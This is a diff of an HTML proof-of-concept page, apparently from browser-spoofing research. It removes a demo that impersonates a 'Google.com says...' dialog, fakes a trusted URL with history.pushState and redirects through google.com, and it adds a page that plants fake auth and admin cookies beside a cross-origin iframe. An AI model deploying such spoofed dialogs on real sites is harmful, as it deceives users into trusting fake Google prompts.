@@ -3,67 +3,24 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>UI Spoofing Example</title>
-  <style>
-    #panel {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.5);
-      z-index: 9999;
-      text-align: center;
-      padding-top: 40vh;
-      color: white;
-    }
-  </style>
+  <title>Parent Page - Cookie Spoofing</title>
 </head>
 <body>
+  <h1>Parent Page (Origin A)</h1>
+  <iframe id="myiframe" src="https://cnfdnfial-ops.github.io/spoof/originB.html" style="width:400px; height:400px;"></iframe>
 
-<h1>Parent Page</h1>
-<button id="trigger">Open Trusted Panel</button>
+  <script>
+    const iframe = document.getElementById("myiframe");
 
-<div id="panel">
-  <h1>Google.com says...</h1>
-  <p>Are you sure you want to proceed?</p>
-  <button onclick="proceed()">Yes</button>
-  <button onclick="cancel()">No</button>
-</div>
+    iframe.addEventListener("load", () => {
+      // Menyiapkan data palsu untuk cookies
+      document.cookie = "userId=12345; path=/";
+      document.cookie = "authToken=abcdefg12345; path=/";
+      document.cookie = "role=admin; path=/";  // Data palsu yang bisa digunakan di iframe
 
-<iframe id="myiframe" src="https://cnfdnfial-ops.github.io/spoof/originB.html" sandbox="allow-scripts" style="width:1px;height:1px;border:0"></iframe>
-
-<script>
-const trigger = document.getElementById('trigger');
-const panel = document.getElementById('panel');
-
-trigger.onclick = () => {
-  // Fake trusted state and show the panel
-  history.pushState({}, '', '/trusted');
-  document.title = 'Google.com says...';
-
-  panel.style.display = 'block';
-};
-
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        // Trigger redirect, making it look like we came from google.com
-        location.href = 'https://google.com:9090';
-      }, 80);
+      // Kirimkan informasi ini melalui postMessage
+      iframe.contentWindow.postMessage({ message: "Data cookies telah disuntikkan" }, 'https://cnfdnfial-ops.github.io/spoof/originB.html');
     });
-  });
-});
-
-function proceed() {
-  alert('Proceeding with your action!');
-  panel.style.display = 'none';
-}
-
-function cancel() {
-  alert('Action cancelled!');
-  panel.style.display = 'none';
-}
-</script>
-
+  </script>
 </body>
 </html>
